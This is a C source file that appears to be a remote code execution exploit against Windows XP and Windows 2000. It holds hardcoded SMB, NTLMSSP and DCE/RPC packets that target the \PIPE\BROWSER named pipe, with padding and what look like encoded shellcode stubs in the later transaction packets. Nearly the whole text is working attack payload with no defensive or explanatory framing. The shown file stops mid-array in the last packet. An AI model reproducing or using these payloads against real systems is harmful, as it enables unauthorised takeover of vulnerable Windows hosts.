#include "includes.h"
#include "functions.h"
#pragma comment(lib, "ws2_32.lib")


char packet_01_winxp[] = 

"\x81\x00\x00\x44\x20\x43\x4b\x46\x44\x45"
"\x4e\x45\x43\x46\x44\x45\x46\x46\x43\x46\x47\x45\x46\x46\x43\x43"
"\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x00\x20\x43\x41\x43"
"\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43"
"\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x41\x41\x00";

char packet_02_winxp[] =

"\x00\x00\x00\x54\xff\x53\x4d\x42\x72\x00"
"\x00\x00\x00\x18\x01\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\xac\x08\x00\x00\x00\xe5\x00\x31\x00\x02\x4c\x41"
"\x4e\x4d\x41\x4e\x31\x2e\x30\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30"
"\x30\x32\x00\x02\x4e\x54\x20\x4c\x41\x4e\x4d\x41\x4e\x20\x31\x2e"
"\x30\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00";

char packet_03_winxp[] =

"\x00\x00\x00\xac\xff\x53\x4d\x42\x73\x00"
"\x00\x00\x00\x18\x01\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\xac\x08\x00\x00\x00\xe5\x0c\xff\x00\x00\x00\xdf"
"\xff\x02\x00\x01\x00\x00\x00\x00\x00\x4e\x00\x00\x00\x00\x00\x5c"
"\xd0\x00\x80\x71\x00\x60\x4c\x06\x06\x2b\x06\x01\x05\x05\x02\xa0"
"\x42\x30\x40\xa0\x0e\x30\x0c\x06\x0a\x2b\x06\x01\x04\x01\x82\x37"
"\x02\x02\x0a\xa2\x2e\x04\x2c\x4e\x54\x4c\x4d\x53\x53\x50\x00\x01"
"\x00\x00\x00\x01\x02\x08\x00\x00\x00\x00\x00\x20\x00\x00\x00\x0c"
"\x00\x0c\x00\x20\x00\x00\x00\x57\x4f\x52\x4b\x53\x54\x41\x54\x49"
"\x4f\x4e\x31\x57\x69\x6e\x64\x6f\x77\x73\x20\x32\x30\x30\x30\x20"
"\x32\x31\x39\x35\x00\x57\x69\x6e\x64\x6f\x77\x73\x20\x32\x30\x30"
"\x30\x20\x35\x2e\x30\x00";

char packet_04_winxp[] =

"\x00\x00\x00\xf2\xff\x53\x4d\x42\x73\x00"
"\x00\x00\x00\x18\x01\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\xac\x08\x00\x08\x00\xe5\x0c\xff\x00\x00\x00\xdf"
"\xff\x02\x00\x01\x00\x00\x00\x00\x00\x94\x00\x00\x00\x00\x00\x5c"
"\xd0\x00\x80\xb7\x00\xa1\x81\x91\x30\x81\x8e\xa2\x81\x8b\x04\x81"
"\x88\x4e\x54\x4c\x4d\x53\x53\x50\x00\x03\x00\x00\x00\x18\x00\x18"
"\x00\x40\x00\x00\x00\x18\x00\x18\x00\x58\x00\x00\x00\x00\x00\x00"
"\x00\x70\x00\x00\x00\x00\x00\x00\x00\x70\x00\x00\x00\x18\x00\x18"
"\x00\x70\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x08"
"\x00\x00\x01\x02\x03\x04\x05\x06\x07\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x8f\x71\x58\xb9\x2f\x96\x84"
"\x04\xca\x65\xee\xfb\xda\xce\x9e\xaf\x28\x8e\xee\x7a\x54\x69\x85"
"\x28\x57\x00\x4f\x00\x52\x00\x4b\x00\x53\x00\x54\x00\x41\x00\x54"
"\x00\x49\x00\x4f\x00\x4e\x00\x31\x00\x57\x69\x6e\x64\x6f\x77\x73"
"\x20\x32\x30\x30\x30\x20\x32\x31\x39\x35\x00\x57\x69\x6e\x64\x6f"
"\x77\x73\x20\x32\x30\x30\x30\x20\x35\x2e\x30\x00";

char packet_05_winxp[] =

"\x00\x00\x00\x3a\xff\x53\x4d\x42\x75\x00"
"\x00\x00\x00\x18\x01\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\xac\x08\x00\x08\x00\xe5\x04\xff\x00\x00\x00\x00"
"\x00\x01\x00\x0f\x00\x00\x5c\x5c\x5c\x49\x50\x43\x24\x00\x3f\x3f"
"\x3f\x3f\x3f\x00";

char packet_06_winxp[] =

"\x00\x00\x00\x5c\xff\x53\x4d\x42\xa2\x00"
"\x00\x00\x00\x18\x01\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x08\xac\x08\x00\x08\x00\xe5\x18\xff\x00\x00\x00\x00"
"\x08\x00\x16\x00\x00\x00\x00\x00\x00\x00\x9f\x01\x02\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x01\x00"
"\x00\x00\x40\x00\x00\x00\x02\x00\x00\x00\x00\x09\x00\x5c\x42\x52"
"\x4f\x57\x53\x45\x52\x00";

char packet_07_winxp[] =

"\x00\x00\x00\x92\xff\x53\x4d\x42\x25\x00"
"\x00\x00\x00\x18\x01\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x08\xac\x08\x00\x08\x00\xe5\x10\x00\x00\x48\x00\x00"
"\x04\xe0\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4a"
"\x00\x48\x00\x4a\x00\x02\x00\x26\x00\x00\x40\x4f\x00\x5c\x50\x49"
"\x50\x45\x5c\x00\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00"
"\x00\x00\x00\x00\xd0\x16\xd0\x16\x00\x00\x00\x00\x01\x00\x00\x00"
"\x00\x00\x01\x00\xc8\x4f\x32\x4b\x70\x16\xd3\x01\x12\x78\x5a\x47"
"\xbf\x6e\xe1\x88\x03\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11"
"\x9f\xe8\x08\x00\x2b\x10\x48\x60\x02\x00\x00\x00";

char packet_08_winxp[] = 

"\x00\x00\x01\x57\xff\x53\x4d\x42\x2f\x00"
"\x00\x00\x00\x18\x01\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x08\xac\x08\x00\x08\x00\xe5\x0e\xff\x00\x00\x00\x00"
"\x40\x00\x00\x00\x00\xff\xff\xff\xff\x08\x00\x18\x01\x00\x00\x18"
"\x01\x3f\x00\x00\x00\x00\x00\x18\x01\x05\x00\x00\x01\x10\x00\x00"
"\x00\x18\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x1f"
"\x00\x6b\x8c\x65\x4c\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00"
"\x00\x00\x00\x68\x36\x63\x01\x00\x00\x00\x00\x00\x00\x63\x01\x00"
"\x00\x4a\xfc\x40\x43\x9f\xf8\xf5\x43\x90\x4f\x40\x9b\x48\x42\x4a"
"\x4f\xf5\x37\x93\x46\x98\x98\x49\x4f\x6a\x51\x59\xd9\xee\xd9\x74"
"\x24\xf4\x5b\x81\x73\x13\x56\x61\x13\xad\x83\xeb\xfc\xe2\xf4\xd7"
"\xa5\xec\x42\xa9\x9e\x57\x51\x3c\x8a\x5e\x45\xaf\x9e\xec\x52\x36"
"\xea\x7f\x89\x72\xea\x56\x91\xdd\x1d\x16\xd5\x57\x8e\x98\xe2\x4e"
"\xea\x4c\x8d\x57\x8a\x5a\x26\x62\xea\x12\x43\x67\xa1\x8a\x01\xd2"
"\xa1\x67\xaa\x97\xab\x1e\xac\x94\x8a\xe7\x96\x02\x45\x3b\xd8\xb3"
"\xea\x4c\x89\x57\x8a\x75\x26\x5a\x2a\x98\xf2\x4a\x60\xf8\xae\x7a"
"\xea\x9a\xc1\x72\x7d\x72\x6e\x67\xba\x77\x26\x15\x51\x98\xed\x5a"
"\xea\x63\xb1\xfb\xea\x53\xa5\x08\x09\x9d\xe3\x58\x8d\x43\x52\x80"
"\x07\x40\xcb\x3e\x52\x21\xc5\x21\x12\x21\xf2\x02\x9e\xc3\xc5\x9d"
"\x8c\xef\x96\x06\x9e\xc5\xf2\xdf\x84\x75\x2c\xbb\x69\x11\xf8\x3c"
"\x63\xec\x7d\x3e\xb8\x1a\x58\xfb\x36\xec\x7b\x05\x32\x40\xfe\x05"
"\x22\x40\xee\x05\x9e\xc3\xcb\x3e\xdf\xfc\xcb\x05\xe8\xf2\x38\x3e"
"\xc5";

char packet_09_winxp[] = 

"\x00\x00\x01\x57\xff\x53\x4d\x42\x2f\x00"
"\x00\x00\x00\x18\x01\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x08\xac\x08\x00\x08\x00\xe5\x0e\xff\x00\x00\x00\x00"
"\x40\x18\x01\x00\x00\xff\xff\xff\xff\x08\x00\x18\x01\x00\x00\x18"
"\x01\x3f\x00\x00\x00\x00\x00\x18\x01\x05\x00\x00\x00\x10\x00\x00"
"\x00\x18\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x1f"
"\x00\x09\xdd\x91\x36\xec\x7b\x3c\x71\x42\xf8\xa9\xb1\x7b\x09\xfb"
"\x4f\xfa\xfa\xa9\xb7\x40\xf8\xa9\xb1\x7b\x48\x1f\xe7\x5a\xfa\xa9"
"\xb7\x43\xf9\x02\x34\xec\x7d\xc5\x09\xf4\xd4\x90\x18\x44\x52\x80"
"\x34\xec\x7d\x30\x0b\x77\xcb\x3e\x02\x7e\x24\xb3\x0b\x43\xf4\x7f"
"\xad\x9a\x4a\x3c\x25\x9a\x4f\x67\xa1\xe0\x07\xa8\x23\x3e\x53\x14"
"\x4d\x80\x20\x2c\x59\xb8\x06\xfd\x09\x61\x53\xe5\x77\xec\xd8\x12"
"\x9e\xc5\xf6\x01\x33\x42\xfc\x07\x0b\x12\xfc\x07\x34\x42\x52\x86"
"\x09\xbe\x74\x53\xaf\x40\x52\x80\x0b\xec\x52\x61\x9e\xc3\x26\x01"
"\x9d\x90\x69\x32\x9e\xc5\xff\xa9\xb1\x7b\x42\x98\x81\x73\xfe\xa9"
"\xb7\xec\x7d\x52\x31\x38\x7a\x54\x38\x39\x72\x4d\x49\x79\x72\x72"
"\x55\x78\x4f\x44\x35\x4c\x64\x6e\x39\x30\x74\x64\x47\x55\x51\x34"
"\x78\x63\x62\x48\x53\x42\x6d\x4c\x31\x56\x5a\x6a\x48\x6e\x55\x30"
"\x32\x4d\x39\x36\x74\x6e\x45\x61\x57\x34\x52\x57\x76\x6d\x71\x77"
"\x41\x74\x38\x61\x74\x50\x41\x6c\x45\x4e\x63\x63\x70\x34\x55\x32"
"\x31\x41\x34\x35\x78\x79\x30\x61\x6e\x50\x52\x37\x55\x4c\x67\x71"
"\x4e\x64\x79\x5a\x43\x52\x72\x30\x6c\x6a\x63\x79\x4f\x6d\x6e\x4b"
"\x37";

char packet_10_winxp[] = 

"\x00\x00\x01\x57\xff\x53\x4d\x42\x2f\x00"
"\x00\x00\x00\x18\x01\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x08\xac\x08\x00\x08\x00\xe5\x0e\xff\x00\x00\x00\x00"
"\x40\x30\x02\x00\x00\xff\xff\xff\xff\x08\x00\x18\x01\x00\x00\x18"
"\x01\x3f\x00\x00\x00\x00\x00\x18\x01\x05\x00\x00\x00\x10\x00\x00"
"\x00\x18\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x1f"
"\x00\x34\x31\x32\x32\x31\x53\x55\x6e\x41\x46\x4d\x6c\x53\x65\x6c"
"\x64\x39\x43\x6a\x65\x79\x71\x33\x42\x71\x37\x68\x73\x72\x41\x42"
"\x4e\x5a\x55\x72\x7a\x6f\x50\x36\x42\x32\x54\x73\x72\x35\x65\x7a"
"\x57\x69\x69\x52\x69\x71\x6c\x65\x53\x53\x64\x73\x68\x4c\x67\x37"
"\x63\x4b\x36\x68\x5a\x66\x6a\x53\x53\x70\x5a\x38\x52\x65\x58\x6f"
"\x78\x45\x7a\x54\x5a\x61\x55\x4f\x6c\x71\x43\x76\x39\x32\x31\x77"
"\x34\x55\x4b\x79\x52\x67\x4e\x73\x6b\x34\x74\x74\x73\x59\x5a\x4c"
"\x4b\x48\x35\x33\x33\x5a\x44\x41\x30\x37\x68\x4e\x6f\x79\x37\x63"
"\x6e\x53\x54\x44\x64\x0a\x08\x02\x00\x32\x36\x79\x37\x46\x79\x49"
"\x53\x04\x08\x02\x00\x6f\x59\x50\x69\x6a\x59\x55\x4a\x58\x65\x61"
"\x49\x52\x66\x59\x47\x49\x43\x36\x48\x63\x76\x34\x7a\x6c\x6a\x63"
"\x59\x38\x50\x4b\x4b\x04\x08\x02\x00\x49\x71\x56\x5a\x6e\x4f\x55"
"\x6c\x04\x08\x02\x00\x77\x6b\x6f\x4d\x63\x79\x6f\x71\x39\x4e\x6d"
"\x71\x61\x6a\x69\x4a\x67\x36\x6c\x52\x65\x79\x7a\x63\x49\x70\x6f"
"\x52\x58\x33\x38\x79\x00\x00\x68\x57\xae\x00\x00\x00\x01\x00\x00"
"\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\xa7\x91\xad\x00\x00"
"\x00";

char packet_11_winxp[] = 

"\x00\x00\x00\x66\xff\x53\x4d\x42\x25\x00"
"\x00\x00\x00\x18\x01\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x08\xac\x08\x00\x08\x00\xe5\x10\x00\x00\x1c\x00\x00"
"\x04\xe0\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4a"
"\x00\x1c\x00\x4a\x00\x02\x00\x26\x00\x00\x40\x23\x00\x5c\x50\x49"
"\x50\x45\x5c\x00\x05\x00\x00\x02\x10\x00\x00\x00\x1c\x00\x00\x00"
"\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x1f\x00\x00\x00\x00\x00";



char packet_01_netwin2k[] =

"\x81\x00\x00\x44\x20\x43\x4b\x46\x44\x45"
"\x4e\x45\x43\x46\x44\x45\x46\x46\x43\x46\x47\x45\x46\x46\x43\x43"
"\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x00\x20\x43\x41\x43"
"\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43"
"\x41\x43\x41\x43\x41\x43\x41\x43\x41\x43\x41\x41\x41\x00";

char packet_02_netwin2k[] =

"\x00\x00\x00\x54\xff\x53\x4d\x42\x72\x00"
"\x00\x00\x00\x18\x01\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\xd8\x02\x00\x00\x23\x97\x00\x31\x00\x02\x4c\x41"
"\x4e\x4d\x41\x4e\x31\x2e\x30\x00\x02\x4c\x4d\x31\x2e\x32\x58\x30"
"\x30\x32\x00\x02\x4e\x54\x20\x4c\x41\x4e\x4d\x41\x4e\x20\x31\x2e"
"\x30\x00\x02\x4e\x54\x20\x4c\x4d\x20\x30\x2e\x31\x32\x00";

char packet_03_netwin2k[] =

"\x00\x00\x00\xac\xff\x53\x4d\x42\x73\x00"
"\x00\x00\x00\x18\x01\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\xd8\x02\x00\x00\x23\x97\x0c\xff\x00\x00\x00\xdf"
"\xff\x02\x00\x01\x00\x00\x00\x00\x00\x4e\x00\x00\x00\x00\x00\x5c"
"\xd0\x00\x80\x71\x00\x60\x4c\x06\x06\x2b\x06\x01\x05\x05\x02\xa0"
"\x42\x30\x40\xa0\x0e\x30\x0c\x06\x0a\x2b\x06\x01\x04\x01\x82\x37"
"\x02\x02\x0a\xa2\x2e\x04\x2c\x4e\x54\x4c\x4d\x53\x53\x50\x00\x01"
"\x00\x00\x00\x01\x02\x08\x00\x00\x00\x00\x00\x20\x00\x00\x00\x0c"
"\x00\x0c\x00\x20\x00\x00\x00\x57\x4f\x52\x4b\x53\x54\x41\x54\x49"
"\x4f\x4e\x31\x57\x69\x6e\x64\x6f\x77\x73\x20\x32\x30\x30\x30\x20"
"\x32\x31\x39\x35\x00\x57\x69\x6e\x64\x6f\x77\x73\x20\x32\x30\x30"
"\x30\x20\x35\x2e\x30\x00";

char packet_04_netwin2k[] =

"\x00\x00\x00\xf2\xff\x53\x4d\x42\x73\x00"
"\x00\x00\x00\x18\x01\x28\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\xd8\x02\x00\x08\x23\x97\x0c\xff\x00\x00\x00\xdf"
"\xff\x02\x00\x01\x00\x00\x00\x00\x00\x94\x00\x00\x00\x00\x00\x5c"
"\xd0\x00\x80\xb7\x00\xa1\x81\x91\x30\x81\x8e\xa2\x81\x8b\x04\x81"
"\x88\x4e\x54\x4c\x4d\x53\x53\x50\x00\x03\x00\x00\x00\x18\x00\x18"
"\x00\x40\x00\x00\x00\x18\x00\x18\x00\x58\x00\x00\x00\x00\x00\x00"
"\x00\x70\x00\x00\x00\x00\x00\x00\x00\x70\x00\x00\x00\x18\x00\x18"
"\x00\x70\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x02\x08"
"\x00\x00\x01\x02\x03\x04\x05\x06\x07\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\xa3\x9e\x5e\x9b\x04\x57\xe3"
"\x15\xb7\x6f\x44\xe9\x1e\x49\xfe\xc0\xbe\xe9\xa6\xa7\x7f\x70\x6d"
"\x69\x57\x00\x4f\x00\x52\x00\x4b\x00\x53\x00\x54\x00\x41\x00\x54"
"\x00\x49\x00\x4f\x00\x4e\x00\x31\x00\x57\x69\x6e\x64\x6f\x77\x73"
"\x20\x32\x30\x30\x30\x20\x32\x31\x39\x35\x00\x57\x69\x6e\x64\x6f"
"\x77\x73\x20\x32\x30\x30\x30\x20\x35\x2e\x30\x00";

char packet_05_netwin2k[] =

"\x00\x00\x00\x62\xff\x53\x4d\x42\x73\x00"
"\x00\x00\x00\x18\x01\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\xd8\x02\x00\x00\x23\x97\x0d\xff\x00\x00\x00\xdf"
"\xff\x02\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x40\x00\x00\x00\x25\x00\x00\x00\x57\x69\x6e\x64\x6f\x77\x73"
"\x20\x32\x30\x30\x30\x20\x32\x31\x39\x35\x00\x57\x69\x6e\x64\x6f"
"\x77\x73\x20\x32\x30\x30\x30\x20\x35\x2e\x30\x00";

char packet_06_netwin2k[] =

"\x00\x00\x00\x3a\xff\x53\x4d\x42\x75\x00"
"\x00\x00\x00\x18\x01\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\xd8\x02\x01\x08\x23\x97\x04\xff\x00\x00\x00\x00"
"\x00\x01\x00\x0f\x00\x00\x5c\x5c\x5c\x49\x50\x43\x24\x00\x3f\x3f"
"\x3f\x3f\x3f\x00";

char packet_07_netwin2k[] =

"\x00\x00\x00\x5c\xff\x53\x4d\x42\xa2\x00"
"\x00\x00\x00\x18\x01\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x08\xd8\x02\x01\x08\x23\x97\x18\xff\x00\x00\x00\x00"
"\x08\x00\x16\x00\x00\x00\x00\x00\x00\x00\x9f\x01\x02\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x01\x00"
"\x00\x00\x40\x00\x00\x00\x02\x00\x00\x00\x00\x09\x00\x5c\x42\x52"
"\x4f\x57\x53\x45\x52\x00";

char packet_08_netwin2k[] =

"\x00\x00\x00\x92\xff\x53\x4d\x42\x25\x00"
"\x00\x00\x00\x18\x01\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x08\xd8\x02\x01\x08\x23\x97\x10\x00\x00\x48\x00\x00"
"\x04\xe0\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x4a"
"\x00\x48\x00\x4a\x00\x02\x00\x26\x00\x00\x40\x4f\x00\x5c\x50\x49"
"\x50\x45\x5c\x00\x05\x00\x0b\x03\x10\x00\x00\x00\x48\x00\x00\x00"
"\x00\x00\x00\x00\xd0\x16\xd0\x16\x00\x00\x00\x00\x01\x00\x00\x00"
"\x00\x00\x01\x00\xc8\x4f\x32\x4b\x70\x16\xd3\x01\x12\x78\x5a\x47"
"\xbf\x6e\xe1\x88\x03\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c\xc9\x11"
"\x9f\xe8\x08\x00\x2b\x10\x48\x60\x02\x00\x00\x00";

char packet_09_netwin2k[] =

"\x00\x00\x01\x57\xff\x53\x4d\x42\x2f\x00"
"\x00\x00\x00\x18\x01\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x08\xd8\x02\x01\x08\x23\x97\x0e\xff\x00\x00\x00\x00"
"\x40\x00\x00\x00\x00\xff\xff\xff\xff\x08\x00\x18\x01\x00\x00\x18"
"\x01\x3f\x00\x00\x00\x00\x00\x18\x01\x05\x00\x00\x01\x10\x00\x00"
"\x00\x18\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x1f"
"\x00\xf2\x7c\x20\xf2\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00"
"\x00\x00\x00\x4f\x51\x15\x02\x00\x00\x00\x00\x00\x00\x15\x02\x00"
"\x00\x49\x3f\x98\x42\x27\x97\xd6\x9b\x43\x4a\x98\x37\xfc\x43\x4b"
"\xf5\x99\x42\x46\x99\x47\x48\x99\x37\xfc\x42\x9b\xf5\x4a\x90\x4f"
"\x37\x37\x4a\x43\xf5\x37\x40\x37\x96\x96\x96\x9b\x49\x9b\x96\x9f"
"\x9b\x99\x48\x48\x98\x37\x47\x43\x93\x49\x4e\xfc\x4a\x4b\x90\x27"
"\x48\x48\x92\x4a\x47\x99\x27\x37\x96\x90\x91\x27\x48\x40\x27\x46"
"\x41\xf8\x4f\x98\x91\xfc\xf8\x47\x4e\x3f\xf9\x97\x90\xd6\x27\x4a"
"\x4e\x97\x42\x3f\x46\x46\xfd\x96\x98\x4f\x48\x98\x4f\x27\xd6\x49"
"\x41\x4a\x46\x4f\x91\x37\x90\x48\xfc\x9b\x96\x90\x9b\x9b\x41\x97"
"\x3f\x43\xd6\x46\x3f\x4a\x43\xf5\x4e\x9f\x27\x43\x98\x4f\x41\x4f"
"\x90\x4f\xf9\xf5\xfd\x4b\x41\xf5\x40\x97\x47\x46\x41\x40\x9f\x98"
"\x43\x43\x4f\x4e\x4a\xfd\x4f\xfc\x96\x46\x43\x42\x47\x97\xfc\x4b"
"\x37\x92\x96\x9f\x3f\x37\xd6\x41\x98\x4f\x4a\xf9\x4a\x9f\x41\xfc"
"\x99\x9f\x98\x27\x37\x37\x4e\x47\x99\x48\x42\x4b\x27\x4e\x37\x92"
"\x40\x4a\x3f\x43\x27\x98\x91\x3f\x4e\x49\x4f\x48\x48\x4b\x9b\x98"
"\x37";

char packet_10_netwin2k[] =

"\x00\x00\x01\x57\xff\x53\x4d\x42\x2f\x00"
"\x00\x00\x00\x18\x01\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x08\xd8\x02\x01\x08\x23\x97\x0e\xff\x00\x00\x00\x00"
"\x40\x18\x01\x00\x00\xff\xff\xff\xff\x08\x00\x18\x01\x00\x00\x18"
"\x01\x3f\x00\x00\x00\x00\x00\x18\x01\x05\x00\x00\x00\x10\x00\x00"
"\x00\x18\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x1f"
"\x00\x4b\x47\x9f\x3f\x48\x41\x49\x9f\x49\x3f\x27\x42\x43\x9b\x99"
"\x46\x97\x97\x96\x27\x91\xfd\x9f\x4e\x3f\x43\x37\x93\x37\x47\x4f"
"\x9f\x90\xf8\x4b\x37\x9b\x4f\x99\x90\x27\x47\x4e\x99\x40\x92\x92"
"\xfc\x9b\xfd\x97\x90\x4e\x47\x90\xf9\xf5\x9f\x4a\x40\xfd\xd6\x27"
"\x93\x48\x40\x43\x93\x99\x4a\x27\xfc\x93\x97\x4b\x48\x49\x99\x4a"
"\x4a\x4f\x91\x4b\x98\x43\x91\x4b\x43\x4e\x9f\x92\x42\x42\x99\x43"
"\x46\x3f\x41\x41\x40\x48\x3f\x46\x40\x27\x4a\x48\x37\x3f\x91\x92"
"\x42\x27\x41\xf5\x4e\x40\x4f\x9b\x49\x27\x9f\x3f\x9f\x4f\x98\xf9"
"\xfc\x41\x40\xf8\x41\x90\x93\xf8\x4e\x37\x43\x91\x37\x92\x4f\xd6"
"\x98\x46\x43\x98\x9f\x93\x4e\x92\x96\x9f\x4a\x97\xf9\x37\x96\x92"
"\x93\x48\x41\x9f\x4e\x4e\x4a\x47\xd6\xf9\x3f\x9b\x47\x40\xf8\x37"
"\x41\x98\x48\xfd\xf9\x9b\x96\x9f\xd6\x9b\xfd\x43\x93\x98\x40\x40"
"\xfd\x48\x47\x4f\x91\x4f\x40\x4a\x41\x99\x4b\x4b\x4e\x37\x48\x93"
"\x92\x43\x37\x41\x42\x4b\x41\xfc\x42\x49\xfc\x92\x97\x27\xfc\x42"
"\x42\x48\x46\x9b\x9b\x93\x91\x27\x9b\x41\x4a\x48\x92\x48\x4b\x41"
"\x4e\xd6\xfc\x42\xf5\x9b\x49\x99\x43\x4f\x97\xfc\x92\x43\xd6\x91"
"\x41";

char packet_11_netwin2k[] =

"\x00\x00\x01\x57\xff\x53\x4d\x42\x2f\x00"
"\x00\x00\x00\x18\x01\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x08\xd8\x02\x01\x08\x23\x97\x0e\xff\x00\x00\x00\x00"
"\x40\x30\x02\x00\x00\xff\xff\xff\xff\x08\x00\x18\x01\x00\x00\x18"
"\x01\x3f\x00\x00\x00\x00\x00\x18\x01\x05\x00\x00\x00\x10\x00\x00"
"\x00\x18\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x1f"
"\x00\xfd\x27\xd6\x4e\x42\x4a\x41\x97\x98\x40\x42\x42\x4b\x3f\xfd"
"\xf9\xf5\x3f\x40\x93\x37\x91\x40\x43\x49\x93\x90\x4f\x40\x99\x4a"
"\x47\x96\xf9\x92\x3f\x37\x97\xf9\xd6\xf5\x43\x46\x9f\x43\xd6\x4b"
"\x37\xf5\xd6\x4a\x91\x4e\x9b\xfd\x90\x49\x49\x96\xfc\x47\xfd\x4f"
"\x4e\x96\x90\x99\x46\x4f\x46\xf5\x43\x4b\xf9\x97\x9f\x98\xfc\x92"
"\x99\x9f\xd6\x4b\x42\x9b\x40\x40\x40\x96\x9b\x90\x90\x41\x97\x92"
"\x96\x98\x96\x4a\x4f\x49\x37\x4f\x43\x4e\x4a\x42\x93\xf9\x37\x98"
"\x93\x92\x3f\x4a\x43\x49\x92\x4e\x41\x27\xf8\x9b\x97\x40\x90\x92"
"\x43\x47\x4e\x96\x40\x90\x98\x4f\x40\x42\x40\x90\x41\xf5\x47\x47"
"\x42\x96\x49\x9f\x4a\xfd\x37\xf5\xd6\x99\x3f\x4f\x47\x4e\x27\xd6"
"\x90\x9f\x42\x93\xd6\x43\x43\x92\x96\x41\x4b\x96\xf9\x4b\xf9\x6a"
"\x51\x59\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x09\xf3\x1e\x8e"
"\x83\xeb\xfc\xe2\xf4\x88\x37\xe1\x61\xf6\x0c\x5a\x72\x63\x18\x53"
"\x66\xf0\x0c\xe1\x71\x69\x78\x72\xaa\x2d\x78\x5b\xb2\x82\x8f\x1b"
"\xf6\x08\x1c\x95\xc1\x11\x78\x41\xae\x08\x18\x57\x05\x3d\x78\x1f"
"\x60\x38\x33\x87\x22\x8d\x33\x6a\x89\xc8\x39\x13\x8f\xcb\x18\xea"
"\xb5";

char packet_12_netwin2k[] =

"\x00\x00\x01\x57\xff\x53\x4d\x42\x2f\x00"
"\x00\x00\x00\x18\x01\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x08\xd8\x02\x01\x08\x23\x97\x0e\xff\x00\x00\x00\x00"
"\x40\x48\x03\x00\x00\xff\xff\xff\xff\x08\x00\x18\x01\x00\x00\x18"
"\x01\x3f\x00\x00\x00\x00\x00\x18\x01\x05\x00\x00\x00\x10\x00\x00"
"\x00\x18\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x1f"
"\x00\x5d\xd7\x36\xfb\xec\x78\x41\xaa\x08\x18\x78\x05\x05\xb8\x95"
"\xd1\x15\xf2\xf5\x8d\x25\x78\x97\xe2\x2d\xef\x7f\x4d\x38\x28\x7a"
"\x05\x4a\xc3\x95\xce\x05\x78\x6e\x92\xa4\x78\x5e\x86\x57\x9b\x90"
"\xc0\x07\x1f\x4e\x71\xdf\x95\x4d\xe8\x61\xc0\x2c\xe6\x7e\x80\x2c"
"\xd1\x5d\x0c\xce\xe6\xc2\x1e\xe2\xb5\x59\x0c\xc8\xd1\x80\x16\x78"
"\x0f\xe4\xfb\x1c\xdb\x63\xf1\xe1\x5e\x61\x2a\x17\x7b\xa4\xa4\xe1"
